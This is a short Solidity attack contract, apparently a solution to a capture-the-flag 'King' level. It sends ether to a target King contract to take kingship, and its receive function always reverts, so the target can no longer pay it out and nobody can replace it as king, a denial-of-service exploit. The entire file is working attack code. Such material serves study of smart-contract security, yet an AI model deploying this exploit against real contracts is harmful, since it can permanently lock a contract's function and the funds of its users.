// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttack {

    King kingContract;

    constructor(address payable _kingContractAddress) payable {
        kingContract = King(_kingContractAddress);
        payable(kingContract).call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }

}